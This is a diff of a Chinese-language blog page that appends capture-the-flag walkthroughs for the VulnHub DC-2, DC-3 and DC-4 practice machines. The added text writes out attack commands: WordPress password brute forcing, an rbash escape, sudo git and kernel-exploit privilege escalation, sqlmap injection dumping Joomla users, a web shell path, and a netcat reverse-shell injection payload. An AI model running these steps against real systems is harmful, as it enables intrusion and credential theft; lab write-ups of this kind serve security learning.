@@ -31,8 +31,15 @@
 <meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625210716.png">
 <meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625213554.png">
 <meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625221245.png">
+<meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230630171454.png">
+<meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230630171316.png">
+<meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708163601.png">
+<meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708193816.png">
+<meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708194932.png">
+<meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708195019.png">
+<meta property="og:image" content="http://example.com/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708204253.png">
 <meta property="article:published_time" content="2023-06-25T11:51:21.000Z">
-<meta property="article:modified_time" content="2023-06-26T10:52:22.104Z">
+<meta property="article:modified_time" content="2023-07-08T15:27:12.780Z">
 <meta property="article:author" content="小zhou">
 <meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary">
@@ -229,7 +236,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-06-26 18:52:22" itemprop="dateModified" datetime="2023-06-26T18:52:22+08:00">2023-06-26</time>
+                <time title="修改时间：2023-07-08 23:27:12" itemprop="dateModified" datetime="2023-07-08T23:27:12+08:00">2023-07-08</time>
               </span>
 
           <br>
@@ -238,14 +245,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>382</span>
+              <span>1.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>4 分钟</span>
             </span>
 
         </div>
@@ -300,11 +307,117 @@
 
 <p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625213554.png"></p>
 <p> 发现find,</p>
-<h2 id="suid-find-提权"><a href="#suid-find-提权" class="headerlink" title="suid find 提权"></a>suid find 提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir test</span><br><span class="line">find test -exec &#x27;/bin/sh&#x27; \;</span><br></pre></td></tr></table></figure>
+<h3 id="suid-find-提权"><a href="#suid-find-提权" class="headerlink" title="suid find 提权"></a>suid find 提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir test</span><br><span class="line">find test -exec &#x27;/bin/sh&#x27; \;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625221245.png"></p>
 <p>最后的flag </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Well done!!!!</span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>
+
+<h2 id="dc-2"><a href="#dc-2" class="headerlink" title="dc-2"></a>dc-2</h2><p>下载地址<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p>
+<p>安装扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.158.0/24 -sn</span><br><span class="line">nmap -sV -A -p- 192.168.158.162</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230630171454.png"></p>
+<p>访问，发现访问不了 ，寄了，看师傅的wp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure>
+
+<p>编辑 hosts,添加如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.158.162 dc-2</span><br></pre></td></tr></table></figure>
+
+<p>然后访问成功，访问,可以看到第一个flag</p>
+<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230630171316.png"></p>
+<p>提示使用cewl,一个生成字典的工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w passwd.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --ignore-main-redirect --url http://dc-2 --enumerate u --force</span><br></pre></td></tr></table></figure>
+
+<p>存在三个用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin tom jerry</span><br></pre></td></tr></table></figure>
+
+<p>有密码，有字典，爆破一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U users.txt -P passwd.txt</span><br></pre></td></tr></table></figure>
+
+<p>爆破结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jerry / adipiscing                                                                       </span><br><span class="line">tom / parturient  </span><br></pre></td></tr></table></figure>
+
+<p>登录，提示后台拿不到shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>
+
+<p>发现cat nl 等命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compgen -c       //查看可以使用的指令</span><br></pre></td></tr></table></figure>
+
+<p>vi flag*</p>
+<p>flag3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43168364/article/details/111830233">(5条消息) 【渗透测试】— rbash逃逸方法简述_rbash 命令_通地塔的博客-CSDN博客</a></p>
+<h3 id="rbash逃逸绕过"><a href="#rbash逃逸绕过" class="headerlink" title="rbash逃逸绕过"></a>rbash逃逸绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//新建一个文件，末行命令，回车</span><br><span class="line">vi test</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line">//设置环境变量</span><br><span class="line">vi test</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure>
+
+<p>之后就能正常命令执行了,cd 到jerry ,第四个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>
+
+
+
+<p>sudo -l 发现提示</p>
+<p>可以用git 提权</p>
+<h3 id="suid-git-提权"><a href="#suid-git-提权" class="headerlink" title="suid git 提权"></a>suid git 提权</h3><p><strong>(我们需要将shell的窗口变窄,使得回显信息不能一页显示)重点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config #然后会出现:输入框，回显信息不能一页显示才有</span><br><span class="line">然后输入</span><br><span class="line">!/bin/bash 或 !&#x27;sh&#x27; #完成提权</span><br></pre></td></tr></table></figure>
+
+<p>最后的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Congratulatons!!!</span><br><span class="line"></span><br><span class="line">A special thanks to all those who sent me tweets</span><br><span class="line">and provided me with feedback - it&#x27;s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
+
+<h2 id="dc-3"><a href="#dc-3" class="headerlink" title="dc-3"></a>dc-3</h2><p>wappalyzer 扫描一下</p>
+<p>发现joomla php框架</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doomlscan -u http://192.168.158.160</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708163601.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br><span class="line">searchsploit -p 42033.txt</span><br><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.158.160/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.158.160/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -p list[fullordering] --batch --tables</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.158.160/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot;  -T &quot;#__users&quot; --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<p>爆出密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.158.160/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot;  -T &quot;#__users&quot; -C &quot;name,password,username&quot;  -p list[fullordering] --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708193816.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john 1.txt 解密md5</span><br></pre></td></tr></table></figure>
+
+<p>账户：admin 密码：snoopy</p>
+<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708194932.png"></p>
+<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708195019.png"></p>
+<p>getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.158.160/templates/beez3/zhou.php</span><br></pre></td></tr></table></figure>
+
+<p>老规矩，弹到msf中，但msf还是没有建议</p>
+<p>suid 也用不了啥</p>
+<h3 id="linux-版本提权"><a href="#linux-版本提权" class="headerlink" title="linux 版本提权"></a>linux 版本提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue  //获取linux 版本号</span><br></pre></td></tr></table></figure>
+
+<p>Ubuntu 16.04 LTS \n \l</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit buntu 16.04</span><br><span class="line">searchsploit -p 39772.txt</span><br></pre></td></tr></table></figure>
+
+<p>Linux Kernel 4.4.0 (Ubuntu 14.04&#x2F;16.04 x86-64) - ‘AF_PACKET’ Race Condition Privilege Escalation</p>
+<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708204253.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/p4sschen/ubuntu16-39772.zip-exp</span><br></pre></td></tr></table></figure>
+
+<p>由于原来的payload已经被删除，这是搜到的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unzip 39772.zip    解压39772.zip文件</span><br><span class="line">cd 39772             到39772目录下</span><br><span class="line">tar xvf exploit.tar    解压exploit.tar，发现ebpf_mapfd_doubleput_exploit目录</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit   到该目录下，发现compile.sh文件</span><br><span class="line">chmod +x compile.sh     给sh文件赋权</span><br><span class="line">./compile.sh    执行sh文件</span><br><span class="line">ls              查看，发现是由gcc编译的.c文件</span><br><span class="line">./doubleput     执行.c文件</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="dc-4"><a href="#dc-4" class="headerlink" title="dc-4"></a>dc-4</h2><p>bp 爆破</p>
+<p>账号admin密码happy</p>
+<p>反弹shelll</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radio=nc+192.168.158.129+12345+-e+/bin/bash&amp;submit=Run</span><br></pre></td></tr></table></figure>
+
+<p>切换终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
 
 
     </div>
@@ -347,7 +460,10 @@
     <a href="/2023/06/23/bugku/" rel="prev" title="bugku">
       <i class="fa fa-chevron-left"></i> bugku
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/08/linux%E5%B7%A5%E5%85%B7/" rel="next" title="linux工具">
+      linux工具 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -406,7 +522,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#dc-1"><span class="nav-number">1.</span> <span class="nav-text">dc-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#suid-find-%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">suid find 提权</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#dc-1"><span class="nav-number">1.</span> <span class="nav-text">dc-1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#suid-find-%E6%8F%90%E6%9D%83"><span class="nav-number">1.1.</span> <span class="nav-text">suid find 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dc-2"><span class="nav-number">2.</span> <span class="nav-text">dc-2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#wpscan"><span class="nav-number">2.1.</span> <span class="nav-text">wpscan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rbash%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.</span> <span class="nav-text">rbash逃逸绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#suid-git-%E6%8F%90%E6%9D%83"><span class="nav-number">2.3.</span> <span class="nav-text">suid git 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dc-3"><span class="nav-number">3.</span> <span class="nav-text">dc-3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-%E7%89%88%E6%9C%AC%E6%8F%90%E6%9D%83"><span class="nav-number">3.1.</span> <span class="nav-text">linux 版本提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dc-4"><span class="nav-number">4.</span> <span class="nav-text">dc-4</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -422,7 +538,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">44</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -435,7 +551,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -471,12 +587,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">57k</span>
+    <span title="站点总字数">60k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:28</span>
+    <span title="站点阅读时长">3:38</span>
 </div>
 
 <!--
